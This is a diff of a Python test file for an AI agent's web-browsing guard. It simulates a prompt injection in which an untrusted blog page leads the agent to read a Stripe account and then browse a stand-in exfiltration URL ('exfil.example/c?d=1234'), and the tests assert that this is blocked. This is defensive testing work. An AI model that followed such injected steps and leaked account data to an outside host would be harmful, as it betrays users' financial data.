@@ -148,8 +148,7 @@ def fake_browser(monkeypatch):
     FakeBrowser.opened = []
     monkeypatch.setattr(browser, "new_browser", lambda headless=False, account=False, guard=None:
                         FakeBrowser(headless, account, guard))
-    # Par défaut, les scénarios historiques simulent une machine CONNECTÉE (sessions présentes) :
-    # les domaines de compte doivent passer par le profil persistant et tainter la session.
+    # Legacy cookies cannot authorize an unscoped account read.
     monkeypatch.setattr(browser, "profile_has_cookies", lambda url, profile_dir=None: True)
 
     def acquire_public(url, guard=None):
@@ -160,7 +159,7 @@ def fake_browser(monkeypatch):
                 rendered=False, blocked=True, main_text="", text_chars=0, raw_chars=0,
                 truncated=False, error="refusé",
             )
-        text = FakeBrowser.PAGES.get(url, "")
+        text = 'Anonymous login page' if url.startswith('https://dashboard.stripe.com') else FakeBrowser.PAGES.get(url, "")
         return browser.PublicPageRecord(
             requested_url=url, final_url=url, fetched_at="2026-09-24T00:00:00+00:00",
             http_status=200, content_type="text/html", title="fixture", extraction_method="http:html_main",
@@ -178,7 +177,7 @@ def run_actions(monkeypatch, role, actions):
     return runtime.run_agent(role, "veille", max_steps=len(actions) + 1)
 
 
-def test_injection_scenario_from_the_audit_is_blocked(monkeypatch, fake_browser):
+def test_injection_cannot_read_account_through_unscoped_browse(monkeypatch, fake_browser):
     result = run_actions(monkeypatch, "SOUT", [
         {"tool": "browse", "args": {"url": "https://blog-exemple.fr/impayes"}},
         {"tool": "browse", "args": {"url": "https://dashboard.stripe.com/"}},
@@ -186,26 +185,30 @@ def test_injection_scenario_from_the_audit_is_blocked(monkeypatch, fake_browser)
     ])
     steps = result["steps"]
     assert "NON FIABLE" in steps[0]["result"]
-    assert "compte connecté" in steps[1]["result"]
-    assert "déjà lu un compte" in steps[2]["result"]
-    assert [(b.account, b.headless) for b in fake_browser.opened] == [(True, False)]
-    assert not any(b.url().startswith("https://exfil.example") for b in fake_browser.opened)
+    assert 'Anonymous login page' in steps[1]['result'] and '1 234' not in steps[1]['result']
+    assert 'merci' in steps[2]['result']
+    assert not fake_browser.opened
 
 
 def test_redirect_to_exfiltration_is_blocked(monkeypatch, fake_browser):
-    result = run_actions(monkeypatch, "SOUT", [
-        {"tool": "browse", "args": {"url": "https://dashboard.stripe.com/"}},
-        {"tool": "browse", "args": {"url": "https://www.youtube.com/redirect"}},
-    ])
-    assert "redirection refusée vers https://exfil.example" in result["steps"][1]["result"]
-    assert fake_browser.opened[1].blocked == ["https://exfil.example/c?d=1234"]
+    with web_guard.session() as state:
+        state.account_read = True
+        result = run_actions(monkeypatch, "SOUT", [
+            {"tool": "browse", "args": {"url": "https://www.youtube.com/redirect"}},
+        ])
+    assert 'account_task' in result['steps'][0]['result']
+    assert not fake_browser.opened
 
 
 def test_taint_is_shared_by_the_whole_mission(monkeypatch, fake_browser):
+    def account_read(args):
+        web_guard.record('https://dashboard.stripe.com/', ACCOUNT, web_guard.current())
+        return {'observation': 'Solde lu via la ressource mandatée'}
+    monkeypatch.setitem(runtime.TOOLS, 'account_task', dict(runtime.TOOLS['account_task'], fn=account_read))
     plan = {"tasks": [{"role": "LEDGER", "task": "lis le solde"}, {"role": "SOUT", "task": "veille"}]}
     actions = iter([
         plan,
-        {"tool": "browse", "args": {"url": "https://dashboard.stripe.com/"}}, {"final": "solde lu"},
+        {"tool": "account_task", "args": {"key": "stripe", "goal": "Lire le solde"}}, {"final": "solde lu"},
         {"tool": "browse", "args": {"url": "https://exfil.example/c?d=1234"}}, {"final": "fin"},
         {"rapport": "r"},
     ])
@@ -414,7 +417,7 @@ def test_anonymous_account_domain_neither_taints_nor_blocks_other_sources(monkey
 
 
 @pytest.mark.parametrize("url", ACCOUNT_DOMAIN_PUBLIC_PAGES)
-def test_page_on_account_domain_with_session_uses_connected_browser_and_taints(
+def test_unscoped_account_domain_ignores_legacy_cookies_and_stays_anonymous(
         monkeypatch, fake_browser, url):
     with web_guard.session() as state:
         result = run_actions(monkeypatch, "SOUT", [
@@ -422,29 +425,22 @@ def test_page_on_account_domain_with_session_uses_connected_browser_and_taints(
             {"tool": "browse", "args": {"url": "https://exfil.example/c?d=1234"}},
         ])
     steps = result["steps"]
-    assert "compte connecté" in steps[0]["result"]
-    assert "déjà lu un compte" in steps[1]["result"]
-    assert [(b.account, b.headless) for b in fake_browser.opened] == [(True, False)]
-    assert state.account_read is True
-    assert not any(b.url().startswith("https://exfil.example") for b in fake_browser.opened)
+    assert 'NON FIABLE' in steps[0]['result'] and 'merci' in steps[1]['result']
+    assert not fake_browser.opened and state.account_read is False
 
 
 def test_after_real_account_read_a_sessionless_account_domain_is_not_anonymous(monkeypatch, fake_browser):
-    # Après une vraie lecture de compte, une origine SANS session ne doit PAS basculer en
-    # acquisition anonyme : sinon l'agent pourrait y écrire la donnée lue via une URL GET,
-    # sans les limites anti-exfiltration du chemin compte (web_guard.check).
     monkeypatch.setattr(browser, "profile_has_cookies",
                         lambda url, profile_dir=None: "linkedin" in url)
     with web_guard.session() as state:
+        state.account_read = True
         result = run_actions(monkeypatch, "SOUT", [
             {"tool": "browse", "args": {"url": "https://www.linkedin.com/posts/cabinet-recrute"}},
             {"tool": "browse", "args": {"url": "https://www.reddit.com/r/freelance/comments/abc/besoin"}},
         ])
     steps = result["steps"]
-    assert "compte connecté" in steps[0]["result"]
-    # Le chemin compte historique est conservé (taint + contrôles), jamais de re-taint minimal.
-    assert "compte connecté" in steps[1]["result"]
-    assert [(b.account, b.headless) for b in fake_browser.opened] == [(True, False), (True, False)]
+    assert all('account_task' in step['result'] for step in steps)
+    assert not fake_browser.opened
     assert state.account_read is True
 
 
